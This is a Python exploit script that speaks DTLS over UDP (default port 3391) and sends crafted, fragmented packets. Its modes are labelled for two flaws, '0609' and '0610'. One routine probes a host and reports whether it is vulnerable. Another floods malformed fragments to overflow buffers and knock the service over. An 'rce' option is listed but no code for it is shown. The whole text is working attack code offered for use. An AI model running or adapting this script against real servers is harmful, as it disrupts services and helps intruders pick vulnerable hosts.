from pwn import *
from argparse import *
from OpenSSL import SSL
from OpenSSL._util import (lib as _lib)

# need DTLS sockets
DTLSv1_METHOD = 7
SSL.Context._methods[DTLSv1_METHOD] = getattr(_lib, "DTLSv1_client_method")


def cert_cb(sock, cert, err_num, depth, ok):

    # got some certificate
    return ok


class Packet:
    def __init__(self, fragment, packet_id, fragment_id, num_fragments, fragment_length):
        self.fragment = fragment
        self.packet_id = packet_id
        self.fragment_id = fragment_id
        self.num_fragments = num_fragments
        self.fragment_length = fragment_length

    def __bytes__(self):
        return (struct.pack("<HHHHH",
                            self.packet_id,           # packet id
                            len(self.fragment) + 6,   # packet length
                            self.fragment_id,         # fragment id
                            self.num_fragments,  # number of fragments
                            self.fragment_length      # fragment length
                            ) + self.fragment)


class Connection:
    def __init__(self, host, port, vuln):
        ctx = SSL.Context(DTLSv1_METHOD)
        ctx.set_verify_depth(2)
        ctx.set_verify(SSL.VERIFY_PEER, cert_cb)
        sock = SSL.Connection(ctx, socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM))
        self.remote = remote(host, port, fam="ipv4", typ="udp", sock=sock)
        self.vuln = vuln

    def send(self, packet: Packet):
        self.remote.send(bytes(packet))

    def check(self):
        pk = Packet(b"\x00", 5, 0, 65, 1)
        self.send(pk)

        res = self.remote.recv(16)

        x = not (0x8000ffff == struct.unpack('<L', res[-4:])[0])

        if (x):
            print("Vulnerable")
        else:
            print("Not vulnerable")

    def dos(self):

        if (self.vuln == 0):
            for i in range(60):
                # choose large fragment length but small fragment ids
                pk = Packet(b"\x20" * 1000, 5, i, 60, 1000)
                self.send(pk)
        else:
            for i in range(1000):
                # choose fragment id >= 65, but small fragment lengths to avoid overflow of first buffer
                pk = Packet(b"\x20" * 10, 5, i, i, 10)
                self.send(pk)


if __name__ == "__main__":
    p = ArgumentParser()
    p.add_argument("--ip", default='127.0.0.1',
                   help="IP", required=False, type=str)
    p.add_argument("--port", default=3391, help="UDP port",
                   required=False, type=int)
    p.add_argument("--vuln", default=0, help="0: 0609, 1: 0610",
                   required=False, type=int, choices=[0, 1])
    p.add_argument("--attack", default=2, help="0:check, 1:dos, 2:rce",
                   required=False, type=int, choices=[0, 1, 2])

    args = p.parse_args()

    c = Connection(args.ip, args.port, args.vuln)

    if (args.attack == 0):
        c.check()

    elif (args.attack == 1):
        c.dos()
